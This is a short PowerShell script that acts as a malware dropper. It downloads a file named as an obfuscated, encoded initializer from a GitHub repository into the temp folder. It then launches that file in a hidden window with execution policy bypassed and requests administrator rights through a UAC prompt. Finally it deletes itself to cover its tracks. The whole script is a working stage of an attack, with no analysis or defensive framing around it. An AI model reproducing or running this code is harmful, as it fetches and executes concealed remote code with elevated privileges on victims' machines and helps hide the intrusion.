$currLoc = "$PSScriptRoot\user.ps1"
$init_uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_encoded_initializer.ps1"
$scriptPath = "$env:temp\initializer.ps1"

iwr -Uri $init_uri -OutFile $scriptPath

if(-not ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){
    Start-Process powershell.exe -ArgumentList "-ep", "bypass", "-noP", "-w", "hidden", "-command", "$scriptPath" -Verb RunAs
}
Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue